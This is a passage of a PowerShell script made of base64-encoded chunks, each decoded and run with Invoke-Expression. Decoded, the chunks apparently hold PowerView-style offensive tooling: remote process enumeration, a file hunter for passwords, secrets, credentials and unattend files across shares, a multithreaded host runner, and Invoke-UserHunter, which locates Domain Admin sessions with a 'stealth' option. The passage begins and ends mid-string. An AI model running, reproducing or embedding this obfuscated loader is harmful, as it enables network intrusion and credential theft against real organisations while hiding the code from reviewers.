WNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPd25lciA9ICRfLmdldG93bmVyKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc05hbWUnICRfLlByb2Nlc3NOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb2Nlc3NJRCcgJF8uUHJvY2Vzc0lECiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RvbWFpbicgJE93bmVyLkRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyJyAkT3duZXIuVXNlcgogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbIV0gRXJyb3IgZW51bWVyYXRpbmcgcmVtb3RlIHByb2Nlc3NlcywgYWNjZXNzIGxpa2VseSBkZW5pZWQ6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiWyFdIFJlbW90ZVBhc3N3b3JkIG11c3QgYWxzbyBiZSBzdXBwbGllZCEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBHZXQtV01Jb2JqZWN0IC1DbGFzcyBXaW4zMl9wcm9jZXNzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT3duZXIgPSAkXy5nZXRvd25lcigpOwogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb2Nlc3NOYW1lJyAkXy5Qcm9jZXNzTmFtZQogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb2Nlc3NJRCcgJF8uUHJvY2Vzc0lECiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRG9tYWluJyAkT3duZXIuRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlcicgJE93bmVyLlVzZXIKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlshXSBFcnJvciBlbnVtZXJhdGluZyByZW1vdGUgcHJvY2Vzc2VzLCBhY2Nlc3MgbGlrZWx5IGRlbmllZDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0ZpbGUgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhdGggPSAnLlwnLAogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVGVybXMsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkT2ZmaWNlRG9jcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRGcmVzaEVYRXMsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTGFzdEFjY2Vzc1RpbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTGFzdFdyaXRlVGltZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRDcmVhdGlvblRpbWUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUZvbGRlcnMsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUhpZGRlbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1dyaXRlQWNjZXNzLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dEZpbGUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXNlUFNEcml2ZSwKICAgICAgICBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgJENyZWRlbnRpYWwgPSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgYmVnaW4gewogICAgICAgICRTZWFyY2hUZXJtcyA9IEAoJ3Bhc3MnLCAnc2Vuc2l0aXZlJywgJ2FkbWluJywgJ2xvZ2luJywgJ3NlY3JldCcsICd1bmF0dGVuZCoueG1sJywgJy52bWRrJywgJ2NyZWRzJywgJ2NyZWRlbnRpYWwnLCAnLmNvbmZpZycpCiAgICAgICAgaWYoISRQYXRoLkVuZHNXaXRoKCdcJykpIHsKICAgICAgICAgICAgJFBhdGggPSAkUGF0aCArICdcJwogICAgICAgIH0KICAgICAgICBpZigkQ3JlZGVudGlhbCAtbmUgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpIHsgJFVzZVBTRHJpdmUgPSAkVHJ1ZSB9CiAgICAgICAgaWYgKCRUZXJtcykgewogICAgICAgICAgICBpZigkVGVybXMgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7CiAgICAgICAgICAgICAgICAkVGVybXMgPSBAKCRUZXJtcykKICAgICAgICAgICAgfQogICAgICAgICAgICAkU2VhcmNoVGVybXMgPSAkVGVybXMKICAgICAgICB9CiAgICAgICAgaWYoLW5vdCAkU2VhcmNoVGVybXNbMF0uc3RhcnRzd2l0aCgiKiIpKSB7CiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJFNlYXJjaFRlcm1zLkNvdW50OyAkaSsrKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoVGVybXNbJGldID0gIiokKCRTZWFyY2hUZXJtc1skaV0pKiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJE9mZmljZURvY3MpIHsKICAgICAgICAgICAgJFNlYXJjaFRlcm1zID0gQCgnKi5kb2MnLCAnKi5kb2N4JywgJyoueGxzJywgJyoueGxzeCcsICcqLnBwdCcsICcqLnBwdHgnKQogICAgICAgIH0KICAgICAgICBpZigkRnJlc2hFWEVzKSB7CiAgICAgICAgICAgICRMYXN0QWNjZXNzVGltZSA9IChnZXQtZGF0ZSkuQWRkRGF5cygtNykuVG9TdHJpbmcoJ01NL2RkL3l5eXknKQogICAgICAgICAgICAkU2VhcmNoVGVybXMgPSAnKi5leGUnCiAgICAgICAgfQogICAgICAgIGlmKCRVc2VQU0RyaXZlKSB7CiAgICAgICAgICAgICRQYXJ0cyA9ICRQYXRoLnNwbGl0KCdcJykKICAgICAgICAgICAgJEZvbGRlclBhdGggPSAkUGFydHNbMC4uKCRQYXJ0cy5sZW5ndGgtMildIC1qb2luICdcJwogICAgICAgICAgICAkRmlsZVBhdGggPSAkUGFydHNbLTFdCiAgICAgICAgICAgICRSYW5kRHJpdmUgPSAoImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6Ii5Ub0NoYXJBcnJheSgpIHwgR2V0LVJhbmRvbSAtQ291bnQgNykgLWpvaW4gJycKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiTW91bnRpbmcgcGF0aCAkUGF0aCB1c2luZyBhIHRlbXAgUFNEcml2ZSBhdCAkUmFuZERyaXZlIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJE51bGwgPSBOZXctUFNEcml2ZSAtTmFtZSAkUmFuZERyaXZlIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1QU1Byb3ZpZGVyIEZpbGVTeXN0ZW0gLVJvb3QgJEZvbGRlclBhdGggLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgbW91bnRpbmcgcGF0aCAkUGF0aCA6ICRfIgogICAgICAgICAgICAgICAgcmV0dXJuICROdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFBhdGggPSAkUmFuZERyaXZlICsgIjpcIiArICRGaWxlUGF0aAogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBTZWFyY2ggcGF0aCAkUGF0aCIKICAgICAgICBmdW5jdGlvbiBJbnZva2UtQ2hlY2tXcml0ZSB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldcGFyYW0oW1N0cmluZ10kUGF0aCkKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRGaWxldGVzdCA9IFtJTy5GSUxFXTo6T3BlbldyaXRlKCRQYXRoKQogICAgICAgICAgICAgICAgJEZpbGV0ZXN0LkNsb3NlKCkKICAgICAgICAgICAgICAgICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAtTWVzc2FnZSAkRXJyb3JbMF0KICAgICAgICAgICAgICAgICRGYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRTZWFyY2hBcmdzID0gIEB7CiAgICAgICAgICAgICdQYXRoJyA9ICRQYXRoCiAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgICdGb3JjZScgPSAkKC1ub3QgJEV4Y2x1ZGVIaWRkZW4pCiAgICAgICAgICAgICdJbmNsdWRlJyA9ICRTZWFyY2hUZXJtcwogICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1NpbGVudGx5Q29udGludWUnCiAgICAgICAgfQogICAgICAgIEdldC1DaGlsZEl0ZW0gQFNlYXJjaEFyZ3MgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJF8KICAgICAgICAgICAgaWYoISRFeGNsdWRlRm9sZGVycyAtb3IgISRfLlBTSXNDb250YWluZXIpIHskX30KICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZigkTGFzdEFjY2Vzc1RpbWUgLW9yICRMYXN0V3JpdGVUaW1lIC1vciAkQ3JlYXRpb25UaW1lKSB7CiAgICAgICAgICAgICAgICBpZigkTGFzdEFjY2Vzc1RpbWUgLWFuZCAoJF8uTGFzdEFjY2Vzc1RpbWUgLWd0ICRMYXN0QWNjZXNzVGltZSkpIHskX30KICAgICAgICAgICAgICAgIGVsc2VpZigkTGFzdFdyaXRlVGltZSAtYW5kICgkXy5MYXN0V3JpdGVUaW1lIC1ndCAkTGFzdFdyaXRlVGltZSkpIHskX30KICAgICAgICAgICAgICAgIGVsc2VpZigkQ3JlYXRpb25UaW1lIC1hbmQgKCRfLkNyZWF0aW9uVGltZSAtZ3QgJENyZWF0aW9uVGltZSkpIHskX30KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHskX30KICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBpZigoLW5vdCAkQ2hlY2tXcml0ZUFjY2VzcykgLW9yIChJbnZva2UtQ2hlY2tXcml0ZSAtUGF0aCAkXy5GdWxsTmFtZSkpIHskX30KICAgICAgICB9IHwgU2VsZWN0LU9iamVjdCBGdWxsTmFtZSxAe05hbWU9J093bmVyJztFeHByZXNzaW9uPXsoR2V0LUFjbCAkXy5GdWxsTmFtZSkuT3duZXJ9fSxMYXN0QWNjZXNzVGltZSxMYXN0V3JpdGVUaW1lLENyZWF0aW9uVGltZSxMZW5ndGggfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmKCRPdXRGaWxlKSB7RXhwb3J0LVBvd2VyVmlld0NTViAtSW5wdXRPYmplY3QgJF8gLU91dEZpbGUgJE91dEZpbGV9CiAgICAgICAgICAgIGVsc2UgeyRffQogICAgICAgIH0KICAgIH0KICAgIGVuZCB7CiAgICAgICAgaWYoJFVzZVBTRHJpdmUgLWFuZCAkUmFuZERyaXZlKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlbW92aW5nIHRlbXAgUFNEcml2ZSAkUmFuZERyaXZlIgogICAgICAgICAgICBHZXQtUFNEcml2ZSAtTmFtZSAkUmFuZERyaXZlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgUmVtb3ZlLVBTRHJpdmUKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MSxNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlNjcmlwdEJsb2NrXQogICAgICAgICRTY3JpcHRCbG9jaywKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTIpXQogICAgICAgIFtIYXNodGFibGVdCiAgICAgICAgJFNjcmlwdFBhcmFtZXRlcnMsCiAgICAgICAgW0ludF0KICAgICAgICAkVGhyZWFkcyA9IDIwLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vSW1wb3J0cwogICAgKQogICAgYmVnaW4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlYnVnJ10pIHsKICAgICAgICAgICAgJERlYnVnUHJlZmVyZW5jZSA9ICdDb250aW51ZScKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSIKICAgICAgICAkU2Vzc2lvblN0YXRlID0gW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLkluaXRpYWxTZXNzaW9uU3RhdGVdOjpDcmVhdGVEZWZhdWx0KCkKICAgICAgICAkU2Vzc2lvblN0YXRlLkFwYXJ0bWVudFN0YXRlID0gW1N5c3RlbS5UaHJlYWRpbmcuVGhyZWFkXTo6Q3VycmVudFRocmVhZC5HZXRBcGFydG1lbnRTdGF0ZSgpCiAgICAgICAgaWYoISROb0ltcG9ydHMpIHsKICAgICAgICAgICAgJE15VmFycyA9IEdldC1WYXJpYWJsZSAtU2NvcGUgMgogICAgICAgICAgICAkVm9yYmlkZGVuVmFycyA9IEAoIj8iLCJhcmdzIiwiQ29uc29sZUZpbGVOYW1lIiwiRXJyb3IiLCJFeGVjdXRpb25Db250ZXh0IiwiZmFsc2UiLCJIT01FIiwiSG9zdCIsImlucHV0IiwiSW5wdXRPYmplY3QiLCJNYXhpbXVtQWxpYXNDb3VudCIsIk1heGltdW1Ecml2ZUNvdW50IiwiTWF4aW11bUVycm9yQ291bnQiLCJNYXhpbXVtRnVuY3Rpb25Db3VudCIsIk1heGltdW1IaXN0b3J5Q291bnQiLCJNYXhpbXVtVmFyaWFibGVDb3VudCIsIk15SW52b2NhdGlvbiIsIm51bGwiLCJQSUQiLCJQU0JvdW5kUGFyYW1ldGVycyIsIlBTQ29tbWFuZFBhdGgiLCJQU0N1bHR1cmUiLCJQU0RlZmF1bHRQYXJhbWV0ZXJWYWx1ZXMiLCJQU0hPTUUiLCJQU1NjcmlwdFJvb3QiLCJQU1VJQ3VsdHVyZSIsIlBTVmVyc2lvblRhYmxlIiwiUFdEIiwiU2hlbGxJZCIsIlN5bmNocm9uaXplZEhhc2giLCJ0cnVlIikKICAgICAgICAgICAgRm9yRWFjaCgkVmFyIGluICRNeVZhcnMpIHsKICAgICAgICAgICAgICAgIGlmKCRWb3JiaWRkZW5WYXJzIC1Ob3RDb250YWlucyAkVmFyLk5hbWUpIHsKICAgICAgICAgICAgICAgICRTZXNzaW9uU3RhdGUuVmFyaWFibGVzLkFkZCgoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuU2Vzc2lvblN0YXRlVmFyaWFibGVFbnRyeSAtQXJndW1lbnRMaXN0ICRWYXIubmFtZSwkVmFyLlZhbHVlLCRWYXIuZGVzY3JpcHRpb24sJFZhci5vcHRpb25zLCRWYXIuYXR0cmlidXRlcykpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCgkRnVuY3Rpb24gaW4gKEdldC1DaGlsZEl0ZW0gRnVuY3Rpb246KSkgewogICAgICAgICAgICAgICAgJFNlc3Npb25TdGF0ZS5Db21tYW5kcy5BZGQoKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLlNlc3Npb25TdGF0ZUZ1bmN0aW9uRW50cnkgLUFyZ3VtZW50TGlzdCAkRnVuY3Rpb24uTmFtZSwgJEZ1bmN0aW9uLkRlZmluaXRpb24pKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRQb29sID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlUG9vbCgxLCAkVGhyZWFkcywgJFNlc3Npb25TdGF0ZSwgJEhvc3QpCiAgICAgICAgJFBvb2wuT3BlbigpCiAgICAgICAgJEpvYnMgPSBAKCkKICAgICAgICAkUFMgPSBAKCkKICAgICAgICAkV2FpdCA9IEAoKQogICAgICAgICRDb3VudGVyID0gMAogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYgKCRDb21wdXRlciAtbmUgJycpIHsKICAgICAgICAgICAgICAgIFdoaWxlICgkKCRQb29sLkdldEF2YWlsYWJsZVJ1bnNwYWNlcygpKSAtbGUgMCkgewogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaVNlY29uZHMgNTAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkUFMgKz0gW3Bvd2Vyc2hlbGxdOjpjcmVhdGUoKQogICAgICAgICAgICAgICAgJFBTWyRDb3VudGVyXS5ydW5zcGFjZXBvb2wgPSAkUG9vbAogICAgICAgICAgICAgICAgJE51bGwgPSAkUFNbJENvdW50ZXJdLkFkZFNjcmlwdCgkU2NyaXB0QmxvY2spLkFkZFBhcmFtZXRlcignQ29tcHV0ZXJOYW1lJywgJENvbXB1dGVyKQogICAgICAgICAgICAgICAgaWYoJFNjcmlwdFBhcmFtZXRlcnMpIHsKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkUGFyYW0gaW4gJFNjcmlwdFBhcmFtZXRlcnMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJFBTWyRDb3VudGVyXS5BZGRQYXJhbWV0ZXIoJFBhcmFtLk5hbWUsICRQYXJhbS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkSm9icyArPSAkUFNbJENvdW50ZXJdLkJlZ2luSW52b2tlKCk7CiAgICAgICAgICAgICAgICAkV2FpdCArPSAkSm9ic1skQ291bnRlcl0uQXN5bmNXYWl0SGFuZGxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKICAgICAgICB9CiAgICB9CiAgICBlbmQgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIldhaXRpbmcgZm9yIHNjYW5uaW5nIHRocmVhZHMgdG8gZmluaXNoLi4uIgogICAgICAgICRXYWl0VGltZW91dCA9IEdldC1EYXRlCiAgICAgICAgd2hpbGUgKCQoJEpvYnMgfCBXaGVyZS1PYmplY3QgeyRfLklzQ29tcGxldGVkIC1lcSAkRmFsc2V9KS5jb3VudCAtZ3QgMCAtb3IgJCgkKCQoR2V0LURhdGUpIC0gJFdhaXRUaW1lb3V0KS50b3RhbFNlY29uZHMpIC1ndCA2MCkgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpU2Vjb25kcyA1MDAKICAgICAgICAgICAgfQogICAgICAgIGZvciAoJHkgPSAwOyAkeSAtbHQgJENvdW50ZXI7ICR5KyspIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRQU1skeV0uRW5kSW52b2tlKCRKb2JzWyR5XSkKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJlcnJvcjogJF8iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZmluYWxseSB7CiAgICAgICAgICAgICAgICAkUFNbJHldLkRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRQb29sLkRpc3Bvc2UoKQogICAgICAgIFdyaXRlLVZlcmJvc2UgIkFsbCB0aHJlYWRzIGNvbXBsZXRlZCEiCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVVzZXJIdW50ZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0cycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtBbGlhcygnSG9zdExpc3QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckZpbGUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJBRFNwYXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVuY29uc3RyYWluZWQsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3JvdXBOYW1lID0gJ0RvbWFpbiBBZG1pbnMnLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldFNlcnZlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJBRFNwYXRoLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJGaWxlLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFkbWluQ291bnQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWxsb3dEZWxlZ2F0aW9uLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrQWNjZXNzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTm9QaW5nLAogICAgICAgIFtVSW50MzJdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNlYXJjaEZvcmVzdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTdGVhbHRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCJERlMiLCJEQyIsIkZpbGUiLCJBbGwiKV0KICAgICAgICAkU3RlYWx0aFNvdXJjZSA9IkFsbCIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRm9yZWlnblVzZXJzLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkVGhyZWFkcwogICAgKQogICAgYmVnaW4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlYnVnJ10pIHsKICAgICAgICAgICAgJERlYnVnUHJlZmVyZW5jZSA9ICdDb250aW51ZScKICAgICAgICB9CiAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBSdW5uaW5nIEludm9rZS1Vc2VySHVudGVyIHdpdGggZGVsYXkgb2YgJERlbGF5IgogICAgICAgIGlmKCREb21haW4pIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBAKCREb21haW4pCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkU2VhcmNoRm9yZXN0KSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gR2V0LU5ldEZvcmVzdERvbWFpbiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTmFtZSB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoIChHZXQtTmV0RG9tYWluKS5uYW1lICkKICAgICAgICB9CiAgICAgICAgaWYoISRDb21wdXRlck5hbWUpIHsgCiAgICAgICAgICAgIFtBcnJheV0kQ29tcHV0ZXJOYW1lID0gQCgpCiAgICAgICAgICAgIGlmKCRDb21wdXRlckZpbGUpIHsKICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtQ29udGVudCAtUGF0aCAkQ29tcHV0ZXJGaWxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRTdGVhbHRoKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTdGVhbHRoIG1vZGUhIEVudW1lcmF0aW5nIGNvbW1vbmx5IHVzZWQgc2VydmVycyIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlN0ZWFsdGggc291cmNlOiAkU3RlYWx0aFNvdXJjZSIKICAgICAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRTdGVhbHRoU291cmNlIC1lcSAiRmlsZSIpIC1vciAoJFN0ZWFsdGhTb3VyY2UgLWVxICJBbGwiKSkgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIEZpbGUgU2VydmVycy4uLiIKICAgICAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSArPSBHZXQtTmV0RmlsZVNlcnZlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkU3RlYWx0aFNvdXJjZSAtZXEgIkRGUyIpIC1vciAoJFN0ZWFsdGhTb3VyY2UgLWVxICJBbGwiKSkgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gUXVlcnlpbmcgZG9tYWluICREb21haW4gZm9yIERGUyBTZXJ2ZXJzLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lICs9IEdldC1ERlNzaGFyZSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgfC